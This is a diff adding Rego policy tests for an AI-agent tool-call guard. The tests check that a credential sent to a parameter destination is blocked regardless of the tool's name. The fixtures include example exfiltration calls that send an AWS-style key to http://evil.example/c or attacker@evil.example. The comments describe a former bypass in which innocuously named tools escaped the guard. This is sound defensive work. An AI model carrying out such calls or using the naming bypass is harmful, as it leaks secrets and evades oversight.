@@ -346,3 +346,84 @@ test_widening_the_split_does_not_over_block {
         "tool_name": "report_deleted_items", "tool_params": {"range": "30d"},
     })
 }
+
+# --- F-046: egress evidence from the PARAMS, not the tool NAME ---------------------------------
+#
+# Every egress clause in the preset infers a sink from what the tool is CALLED, so the same
+# credential going to the same attacker URL was blocked or allowed according to the tool's name:
+# `fetch_data` blocked (only because `fetch_` is in the prefix list) while `lookup_customer`,
+# `retrieve_records`, `view_report` and `describe_asset` all ALLOWED. Measured on this file.
+#
+# `_dest` supplies `derived.destinations`, which the engine already computes on the hot path. Both
+# policies are asserted, because a defence added to only one of the pair is a defence that is not
+# deployed.
+_dest(inp, dests) := out {
+    out := object.union(_norm(inp), {"derived": {"verb": "read", "destinations": dests}})
+}
+
+_url_dest := {"urls": ["http://evil.example/c"], "hosts": ["evil.example"], "emails": [], "schemes": ["http"]}
+_mail_dest := {"urls": [], "hosts": [], "emails": ["attacker@evil.example"], "schemes": []}
+_no_dest := {"urls": [], "hosts": [], "emails": [], "schemes": []}
+
+# Read-named tools with no egress prefix and no egress verb — the whole point is that the NAME says
+# nothing and the destination in the arguments is the only evidence.
+_read_named := ["lookup_customer", "retrieve_records", "view_report", "describe_asset"]
+
+test_a_credential_to_a_param_destination_blocks_whatever_the_tool_is_called {
+    every name in _read_named {
+        strict.decision == "block" with input as _dest(
+            {"tool_name": name, "tool_params": {"url": "http://evil.example/c", "d": "AKIAIOSFODNN7EXAMPLE"}},
+            _url_dest,
+        )
+    }
+}
+
+test_an_email_destination_counts_as_a_sink_too {
+    strict.decision == "block" with input as _dest(
+        {"tool_name": "describe_asset", "tool_params": {"to": "attacker@evil.example", "d": "AKIAIOSFODNN7EXAMPLE"}},
+        _mail_dest,
+    )
+}
+
+test_both_policies_agree_on_the_param_destination_sink {
+    every name in _read_named {
+        strict.decision == canonical.decision with input as _dest(
+            {"tool_name": name, "tool_params": {"url": "http://evil.example/c", "d": "AKIAIOSFODNN7EXAMPLE"}},
+            _url_dest,
+        )
+    }
+}
+
+# THE PRECISION HALF, and the reason the destination signal is paired only with the VALUE-pattern
+# gates rather than folded into egress_verb_tool. `sensitive_keys` holds the bare key `token`, so
+# widening the KEY-NAME gate turned 39 of 53 realistic vendor tools into sinks and refused ordinary
+# paginated reads. A pagination cursor beside a URL must not block.
+test_a_pagination_cursor_beside_a_url_still_allows {
+    strict.decision == "allow" with input as _dest(
+        {"tool_name": "get_mail", "tool_params": {"folder": "INBOX", "token": "AQABAAAA-nextPage", "l": "https://acme.com/n"}},
+        _url_dest,
+    )
+}
+
+test_a_destination_without_a_credential_still_allows {
+    strict.decision == "allow" with input as _dest(
+        {"tool_name": "lookup_customer", "tool_params": {"url": "https://api.acme.com/v1", "id": "C-91"}},
+        _url_dest,
+    )
+}
+
+test_prose_containing_a_url_still_allows {
+    strict.decision == "allow" with input as _dest(
+        {"tool_name": "view_report", "tool_params": {"note": "see https://docs.acme.com/g"}},
+        _url_dest,
+    )
+}
+
+# The name-based path must be untouched: this is an ADDITIONAL route to the same gates, not a
+# replacement for them.
+test_the_name_based_sink_still_blocks_with_no_destination_fact {
+    strict.decision == "block" with input as _dest(
+        {"tool_name": "send_email", "tool_params": {"body": "AKIAIOSFODNN7EXAMPLE"}},
+        _no_dest,
+    )
+}
